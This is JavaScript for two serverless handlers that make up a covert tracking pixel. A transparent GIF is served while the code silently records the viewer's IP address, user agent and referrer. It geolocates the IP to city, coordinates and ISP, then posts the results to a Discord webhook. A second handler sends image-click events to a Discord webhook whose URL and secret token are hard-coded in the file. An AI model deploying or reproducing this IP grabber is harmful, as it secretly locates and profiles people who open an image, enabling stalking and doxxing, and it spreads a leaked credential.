const GIF_BASE64 = "R0lGODlhAQABAIAAAP///wAAACwAAAAAAQABAAACAkQBADs=";
const TRANSPARENT_GIF = Buffer.from(GIF_BASE64, "base64");

const getClientIp = (req) => {
  const xForwardedFor = req.headers["x-forwarded-for"];
  if (typeof xForwardedFor === "string" && xForwardedFor.length > 0) {
    return xForwardedFor.split(",")[0].trim();
  }

  const xRealIp = req.headers["x-real-ip"];
  if (typeof xRealIp === "string" && xRealIp.length > 0) {
    return xRealIp.trim();
  }

  return req.socket?.remoteAddress || "unknown";
};

const parseGeo = async (ip) => {
  if (!ip || ip === "unknown") {
    return null;
  }

  try {
    const response = await fetch(
      `http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,query`
    );

    if (!response.ok) {
      return null;
    }

    const data = await response.json();
    if (data.status !== "success") {
      return null;
    }

    return {
      ip: data.query || ip,
      country: data.country || null,
      region: data.regionName || null,
      city: data.city || null,
      zip: data.zip || null,
      latitude: data.lat || null,
      longitude: data.lon || null,
      timezone: data.timezone || null,
      isp: data.isp || null,
    };
  } catch (_error) {
    return null;
  }
};

const sendToDiscord = async (payload) => {
  const webhookUrl = process.env.WEBHOOK_URL;
  if (!webhookUrl) {
    return;
  }

  const discordBody = {
    username: "Tracking Pixel",
    embeds: [
      {
        title: "New Tracking Pixel Hit",
        color: 5814783,
        timestamp: payload.timestamp,
        fields: [
          { name: "IP", value: payload.ip || "unknown", inline: true },
          { name: "User-Agent", value: payload.userAgent || "unknown" },
          { name: "Referrer", value: payload.referrer || "none" },
          {
            name: "Geo",
            value: payload.geo
              ? `${payload.geo.city || "n/a"}, ${payload.geo.region || "n/a"}, ${payload.geo.country || "n/a"} (${payload.geo.latitude ?? "?"}, ${payload.geo.longitude ?? "?"})`
              : "unavailable",
          },
          { name: "URL", value: payload.url || "unknown" },
        ],
      },
    ],
  };

  try {
    await fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(discordBody),
    });
  } catch (_error) {
    // Silent failure by design.
  }
};

module.exports = async (req, res) => {
  const ip = getClientIp(req);
  const timestamp = new Date().toISOString();
  const userAgent = req.headers["user-agent"] || "unknown";
  const referrer = req.headers.referer || req.headers.referrer || "none";
  const host = req.headers.host || "";
  const protocol = req.headers["x-forwarded-proto"] || "https";
  const url = `${protocol}://${host}${req.url || "/api/log"}`;

  const geo = await parseGeo(ip);

  const payload = {
    ip,
    userAgent,
    referrer,
    timestamp,
    url,
    geo,
  };

  // Fire-and-forget to keep the pixel response fast.
  void sendToDiscord(payload);

  res.setHeader("Content-Type", "image/gif");
  res.setHeader("Content-Length", TRANSPARENT_GIF.length);
  res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, proxy-revalidate");
  res.setHeader("Pragma", "no-cache");
  res.setHeader("Expires", "0");
  res.status(200).send(TRANSPARENT_GIF);
};
export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  const { url, userAgent } = req.body || {};

  const payload = {
    content: "New image click logged",
    embeds: [
      {
        title: "Image Click Event",
        fields: [
          { name: "URL", value: url || "N/A" },
          { name: "User-Agent", value: userAgent || "N/A" },
          { name: "Timestamp", value: new Date().toISOString() },
        ],
      },
    ],
  };

  try {
    await fetch("https://discord.com/api/webhooks/1501284240484995307/Ov6tKqjQmDxbMaKTYoEfN7QHTEPjqv0XyCnkl3d91dMVM5tlFA6l3B00tsBoOvdYo7kq", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    });

    return res.status(200).json({ ok: true });
  } catch (error) {
    return res.status(500).json({ error: "Failed to forward log" });
  }
}
